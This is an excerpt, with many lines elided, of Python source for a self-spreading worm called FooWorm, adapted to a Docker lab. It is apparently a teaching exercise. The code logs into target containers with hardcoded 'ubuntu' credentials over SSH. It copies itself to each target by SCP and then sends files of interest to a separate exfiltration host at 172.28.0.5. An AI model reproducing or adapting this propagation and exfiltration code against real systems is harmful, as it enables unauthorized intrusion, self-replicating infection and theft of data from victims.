...
def get_new_usernames(how_many):
    # DOCKER VERSION: usando usuario 'ubuntu' para los contenedores
    if debug: return ['ubuntu']
...
def get_new_passwds(how_many):
    # DOCKER VERSION: usando contraseña 'ubuntu' para los contenedores
    if debug: return ['ubuntu']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
...
def get_fresh_ipaddresses(how_many):
    # DOCKER VERSION: usando las IPs de los contenedores Docker
    # ubuntu2: 172.28.0.3 (target)
    # ubuntu3: 172.28.0.4 (target)
    if debug: return ['172.28.0.3', '172.28.0.4']
    if how_many == 0: return 0
    ipaddresses = []
...
if __name__ == '__main__':
    ...
    logger.info("FooWorm starting (Docker version)")
                ...
                for ip_address in get_fresh_ipaddresses(NHOSTS):
                    ...
                    try:
                        ...
                        try:
                            ...
                            try:
                                scpcon.put(temp_file_path, 'FooWorm_Docker.py')
                    ...
                    # Exfiltrate files (DOCKER VERSION: usando ubuntu4 como servidor de exfiltración)
                    if files_of_interest_at_target:
                        logger.info(f"Starting exfiltration: source_host={ip_address}, files={len(files_of_interest_at_target)}")
                        ssh = None
                        try:
                            logger.debug("Connecting to exfiltration host: host=172.28.0.5")
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            
                            ssh.connect('172.28.0.5', port=22, username='ubuntu', password='ubuntu', timeout=5)
                            
                            scpcon = scp.SCPClient(ssh.get_transport())
                            
                            logger.info("Connected to exfiltration host: host=172.28.0.5")
                            ...
                            scpcon.close()
                            ssh.close()
                            logger.debug("Closed exfiltration connection: host=172.28.0.5")
                        except Exception as e:
                            logger.exception("Exfiltration connection failed: host=172.28.0.5")
                            if ssh:
                                try:
                                    ssh.close()
                                except:
